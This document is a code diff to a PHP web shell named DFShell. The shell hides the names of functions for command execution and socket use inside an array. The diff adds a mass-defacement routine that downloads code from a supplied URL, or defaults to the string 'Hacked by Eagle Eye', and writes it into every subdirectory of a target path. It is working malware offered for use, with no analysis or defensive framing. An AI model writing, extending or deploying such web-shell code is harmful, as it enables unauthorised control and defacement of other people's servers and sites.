@@ -15,7 +15,7 @@ error_reporting(0);
 // creating session
 
 session_start();
-$DFShell_Ver = 2.0;
+$DFShell_Ver = 1.0;
 $DFConfig = array($_REQUEST,$_POST,$_SERVER,$_COOKIE,$_FILES);
 $DFSyntax = array("file_get_contents","fileperms","readfile","chdir","getcwd","function_exists","fsockopen","pcntl_fork",
 "stream_set_blocking","proc_get_status","proc_open","proc_close","posix_setsid","stream_select","stream_get_contents"); // $GLOBALS['DFSyntax']
@@ -847,7 +847,18 @@ class DFShell{
                     echo explode('||',$GLOBALS['DFSyntax'][0](self::$remote_url.'/others.html'))[2];
                 }else{
                     $arrpath = glob($GLOBALS['DFConfig'][1]['masspath'] . $slashtype . '*', GLOB_ONLYDIR);
-                    $ncode = $GLOBALS['DFConfig'][1]['codemass'];
+                    
+                    if(!empty($GLOBALS['DFConfig'][1]['fromurl']) && 
+                    $GLOBALS['DFConfig'][1]['fromurl']!=="" &&
+                    $GLOBALS['DFConfig'][1]['fromurl']!==NULL){
+                        if(filter_var($GLOBALS['DFConfig'][1]['fromurl'], FILTER_VALIDATE_URL)){
+                            $ncode = file_get_contents($GLOBALS['DFConfig'][1]['fromurl']);
+                        }else{
+                            die("<script>alert('Check url');window.location.replace(window.location.href);</script>");
+                        }
+                    }else{
+                        $ncode = $GLOBALS['DFConfig'][1]['codemass'] ?: 'Hacked by Eagle Eye';
+                    }
                     $lekluh = $GLOBALS['DFConfig'][1]['masspath'] . $slashtype . $GLOBALS['DFConfig'][1]['massname'];
                     $rakluh = fopen($lekluh,'w');
                     fwrite($rakluh,$ncode);
